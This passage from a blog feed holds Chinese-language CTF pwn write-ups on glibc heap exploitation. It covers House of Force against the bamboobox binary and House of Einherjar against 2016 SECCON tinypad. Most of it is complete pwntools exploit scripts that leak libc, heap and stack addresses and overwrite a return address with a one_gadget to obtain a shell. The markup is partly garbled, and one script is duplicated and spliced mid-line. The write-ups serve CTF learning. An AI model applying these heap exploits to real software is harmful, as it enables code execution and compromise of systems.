&lt;itemlist+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br><span class="hljs-comment"><code class="language-hljs c">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x6020c0</span><br><span class="hljs-number">0x6020c0</span> &lt;itemlist&gt;:<span class="hljs-number">0x000000000000000a</span><span class="hljs-number">0x0000000000603030</span> #chunk0<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020d0</span> &lt;itemlist+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000014</span><span class="hljs-number">0x0000000000603050</span> #chunk1<br>#struct_size        #struct_content_ptr<br><span class="hljs-number">0x6020e0</span> &lt;itemlist+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020f0</span> &lt;itemlist+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602100</span> &lt;itemlist+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br><span class="hljs-comment">//注意struct_content_ptr指向malloc出来malloc_data的地址</span><br></code></pre></td></tr></tbody></table></figure><h3 id="攻击原理及exp"><a href="#攻击原理及exp" class="headerlink" title="攻击原理及exp"></a>攻击原理及exp</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre class=" language-hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./bamboobox'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>  p.sendlineafter(<span class="hljs-string">''</span>,<span class="hljs-built_in">str</span>(choice))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>  cmd(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>  cmd(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'the item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>  cmd(<span class="hljs-number">4</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>  cmd(<span class="hljs-number">5</span>)<br><br>magic = <span class="hljs-number">0x400d49</span><br>create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br>content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br>offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br>create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number"><code class="language-hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./bamboobox'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice</span>):<br>  p.sendlineafter(<span class="hljs-string">''</span>,<span class="hljs-built_in">str</span>(choice))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>  cmd(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>  cmd(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br>  p.sendlineafter(<span class="hljs-string">'item name:'</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">'the item:'</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>  cmd(<span class="hljs-number">4</span>)<br>  p.sendlineafter(<span class="hljs-string">'of item:'</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>  cmd(<span class="hljs-number">5</span>)<br><br>magic = <span class="hljs-number">0x400d49</span><br>create(<span class="hljs-number">0x30</span>, <span class="hljs-string">"aaaa"</span>)<br>content=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">'1'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>,content)<br>offset=-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>create(offset,<span class="hljs-string">'bbbb'</span>)<br>create(<span class="hljs-number">0x10</span>,p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）&quot;&gt;&lt;a href=&quot;#PWN入门（3-12-1）-House-Of-Force（控制top-chunk）（基础）&quot; class=&quot;headerlink&quot; title=&quot;PW</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Einherjar</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Einherjar/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Einherjar/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:19.992Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p><p>free 函数中的后向合并核心操作如下</p><pre><code>    /* consolidate backward */    if (!prev_inuse(p)) {        prevsize = prev_size(p);        size += prevsize;        p = chunk_at_offset(p, -((long) prevsize));        unlink(av, p, bck, fwd);    }</code></pre><blockquote><p>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))<br class='item-img' data-src='https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p></blockquote><h2 id="思路1：两个chunk通过后向unlink直接实现任意地址写"><a href="#思路1：两个chunk通过后向unlink直接实现任意地址写" class="headerlink" title="思路1：两个chunk通过后向unlink直接实现任意地址写"></a>思路1：两个chunk通过后向unlink直接实现任意地址写</h2><p>假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。</p><h2 id="思路2：三个chunk通过后向unlink实现double-free"><a href="#思路2：三个chunk通过后向unlink实现double-free" class="headerlink" title="思路2：三个chunk通过后向unlink实现double free"></a>思路2：三个chunk通过后向unlink实现double free</h2><pre><code>chunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache chunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inusechunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小chunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中</code></pre><p>申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。</p><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016_seccon_tinypad"></a>2016_seccon_tinypad</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851" alt="img"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk<br class='item-img' data-src='https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>主函数</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rax  int choice; // eax  int v5; // eax  __int64 v6; // rax  size_t v7; // rax  int c; // [rsp+4h] [rbp-1Ch] BYREF  int i; // [rsp+8h] [rbp-18h]  int index; // [rsp+Ch] [rbp-14h]  int v12; // [rsp+10h] [rbp-10h]  int v13; // [rsp+14h] [rbp-Ch]  unsigned __int64 v14; // [rsp+18h] [rbp-8h]  v14 = __readfsqword(0x28u);  v12 = 0;  write_n(&amp;unk_4019F0, 1uLL);  write_n(    "  ============================================================================\n"    "// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n"    "||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n"    "||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n"    "||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n"    "\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n"    "  ============================================================================\n",    563uLL);  write_n(&amp;unk_4019F0, 1uLL);  do  {    for ( i = 0; i &lt;= 3; ++i )    {      LOBYTE(c) = i + 49;      writeln("+------------------------------------------------------------------------------+\n", 81LL);      write_n(" #   INDEX: ", 12uLL);      writeln(&amp;c, 1LL);      write_n(" # CONTENT: ", 12uLL);      if ( *&amp;tinypad[16 * i + 264] )      {        v3 = strlen(*&amp;tinypad[16 * i + 264]);        writeln(*&amp;tinypad[16 * i + 264], v3);      }      writeln(&amp;unk_4019F0, 1LL);    }    index = 0;    choice = getcmd();    v12 = choice;    if ( choice == 68 )    {      write_n("(INDEX)&gt;&gt;&gt; ", 11uLL);      index = read_int();      if ( index &lt;= 0 || index &gt; 4 )            // 只能申请四个chunk                                                //       {LABEL_29:        writeln("Invalid index", 13LL);        continue;      }      if ( !*&amp;tinypad[16 * index + 240] )      {LABEL_31:        writeln("Not used", 8LL);        continue;      }      free(*&amp;tinypad[16 * index + 248]);      *&amp;tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0      writeln("\nDeleted.", 9LL);      //uaf    }    else if ( choice &gt; 0x44 )    {      if ( choice != 0x45 )      {        if ( choice == 81 )          continue;LABEL_41:        writeln("No such a command", 17LL);        continue;      }      write_n("(INDEX)&gt;&gt;&gt; ", 11uLL);      index = read_int();      if ( index &lt;= 0 || index &gt; 4 )        goto LABEL_29;      if ( !*&amp;tinypad[16 * index + 240] )        goto LABEL_31;      c = 48;      strcpy(tinypad, *&amp;tinypad[16 * index + 248]);      while ( toupper(c) != 89 )      {        write_n("CONTENT: ", 9uLL);        v6 = strlen(tinypad);        writeln(tinypad, v6);        write_n("(CONTENT)&gt;&gt;&gt; ", 13uLL);        v7 = strlen(*&amp;tinypad[16 * index + 248]);        read_until(tinypad, v7, 10u);        writeln("Is it OK?", 9LL);        write_n("(Y/n)&gt;&gt;&gt; ", 9uLL);        read_until(&amp;c, 1uLL, 10u);      }      strcpy(*&amp;tinypad[16 * index + 248], tinypad);      writeln("\nEdited.", 8LL);    }    else    {      if ( choice != 65 )        goto LABEL_41;      while ( index &lt;= 3 &amp;&amp; *&amp;tinypad[16 * index + 256] )        ++index;      if ( index == 4 )      {        writeln("No space is left.", 17LL);      }      else      {        v13 = -1;        write_n("(SIZE)&gt;&gt;&gt; ", 10uLL);        v13 = read_int();        if ( v13 &lt;= 0 )        {          v5 = 1;        }        else        {          v5 = v13;          if ( v13 &gt; 0x100 )            v5 = 256;        }        v13 = v5;        *&amp;tinypad[16 * index + 256] = v5;        *&amp;tinypad[16 * index + 264] = malloc(v13);        if ( !*&amp;tinypad[16 * index + 264] )        {          writerrln("[!] No memory is available.", 27LL);          exit(-1);        }        write_n("(CONTENT)&gt;&gt;&gt; ", 13uLL);        read_until(*&amp;tinypad[16 * index + 264], v13, 10u);        writeln("\nAdded.", 7LL);      }    }  }  while ( v12 != 81 );  return 0;}</code></pre><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><pre><code>    *&amp;tinypad[16 * index + 0x100] = v5;    *&amp;tinypad[16 * index + 264] = malloc(v13);</code></pre><p>存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>该edit函数调用的read_until函数存在off-by-null漏洞</p><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851" alt="img"><br>free函数存在uaf漏洞</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先泄露libc和heap地址</p><p>利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p><p>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook</p><pre><code>v6 = strlen(tinypad);</code></pre><p>可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>先把前面的代码写好</p><pre><code># coding=utf-8from pwn import*context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debugsh = process('./tinypad')libc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims             :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content='a'):    sla('(CMD)&gt;&gt;&gt; ','a')    sla('(SIZE)&gt;&gt;&gt; ',str(size))    sla('(CONTENT)&gt;&gt;&gt; ',content)def edit(idx, content):    sla('(CMD)&gt;&gt;&gt; ','e')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))    sla('(CONTENT)&gt;&gt;&gt; ',content)    sla('Is it OK?\n','Y')   def free(idx):    sla('(CMD)&gt;&gt;&gt; ','d')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))def exit():    sla('(CMD)&gt;&gt;&gt; ','Q')</code></pre><p>先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78</p><pre><code>add(0x100)add(0x100)add(0x100)add(0x100)free(3)free(1)ru('INDEX: 1')ru('CONTENT: ')heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2ru('INDEX: 3')ru('CONTENT: ')libcbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) - 0x3C4B78environ = libc.sym['environ']+libcbaselg('heapbase',heapbase)lg('libcbase',libcbase)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e4a80c077a944e0aaf438d8d41d87caf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p><pre><code>add(0x100)add(0x100)#dbg()#四个chunk与top chunk合并free(4)free(1)free(2)free(3)#dbg()#empty now add(0x100,'a'*0x100)edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))#dbg()free(1)add(0x10) #1add(0xf0) #2add(0x10) #3add(0x100,'a'*0x100) #4</code></pre><p>之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk</p><pre><code>#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))free(1)target = heapbase+0x20-0x602070add(0x18,b'a'*0x10+p64(target)) #1dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将</p><pre><code>free(2)edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）</p><pre><code>add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))ru('INDEX: 1')ru('CONTENT: ')stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))target =  -0xF0 + stack lg('stack',stack)lg('target',target)#0x7fc7dd85ff38 &lt;environ&gt;:0x00007ffc91b85d580x0000000000000000#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0dbg()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack<br class='item-img' data-src='https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\x00”)，再退出程序，获得shell</p><pre><code>edit(2,p64(target))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]shell = one_gadget[0] + libcbaseedit(1,p64(shell))exit()itr()</code></pre><p class='item-img' data-src='https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8from pwn import*context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debugsh = process('./tinypad')libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims             :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\0'))uu64    = lambda data               :u64(data.ljust(8,'\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content='a'):    sla('(CMD)&gt;&gt;&gt; ','a')    sla('(SIZE)&gt;&gt;&gt; ',str(size))    sla('(CONTENT)&gt;&gt;&gt; ',content)def edit(idx, content):    sla('(CMD)&gt;&gt;&gt; ','e')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))    sla('(CONTENT)&gt;&gt;&gt; ',content)    sla('Is it OK?\n','Y')   def free(idx):    sla('(CMD)&gt;&gt;&gt; ','d')    sla('(INDEX)&gt;&gt;&gt; ',str(idx))def exit():    sla('(CMD)&gt;&gt;&gt; ','Q')     add(0x100)add(0x100)add(0x100)add(0x100)free(3)free(1)ru('INDEX: 1')ru('CONTENT: ')heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2ru('INDEX: 3')ru('CONTENT: ')main_arena_88 = u64(ru('\n')[:-1].ljust(8,b'\x00')) libcbase = main_arena_88-0x3C4B78environ = libc.sym['environ']+libcbaselg('heapbase',heapbase)lg('libcbase',libcbase)#dbg()add(0x100)add(0x100)#dbg()#四个chunk与top chunk合并free(4)free(1)free(2)free(3)#dbg()#empty now add(0x100,'a'*0x100)edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))#dbg()free(1)add(0x10) #1add(0xf0) #2add(0x10) #3add(0x100,'a'*0x100) #4#dbg()free(1)#dbg()target = heapbase+0x20-0x602070add(0x18,b'a'*0x10+p64(target)) #1free(2)#dbg()edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)#dbg()add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))ru('INDEX: 1')ru('CONTENT: ')stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))target =  -0xF0 + stack lg('stack',stack)lg('target',target)#0x7f825ab56f38 &lt;environ&gt;:0x00007ffe282d8c280x0000000000000000#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0#dbg()edit(2,p64(target))one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]shell = one_gadget[0] + libcbaseedit(1,p64(shell))exit() itr()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-of-Einherjar&quot;&gt;&lt;a href=&quot;#House-of-Einherjar&quot; class=&quot;headerlink&quot; title=&quot;House of Einherjar&quot;&gt;&lt;/a&gt;House of Einherjar&lt;/h1&gt;&lt;h2 id=&quot;原</summary>
      
    
    
    
